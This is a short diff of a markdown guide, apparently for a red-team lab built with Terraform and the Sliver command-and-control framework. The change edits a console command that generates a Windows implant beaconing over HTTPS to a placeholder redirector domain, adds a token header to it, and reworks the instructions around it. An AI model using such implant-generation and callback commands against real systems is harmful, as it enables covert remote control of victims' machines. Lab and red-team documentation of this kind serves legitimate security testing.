@@ -813,13 +813,10 @@ This starts a plain HTTP listener on port 443. The implant connects over HTTPS t
 **In the Sliver console:**
 
 ```text
-sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --save /tmp/implant.exe
+sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --header "X-Request-ID: <YOUR_TOKEN>" --save /tmp/implant.exe
 ```
 
-Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
-
-> [!NOTE]
-> The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.
+Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. Replace `<YOUR_TOKEN>` with the `c2_header_value` from `terraform output deployment_info`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
 
 **Transfer the implant to the Windows workstation:**
 
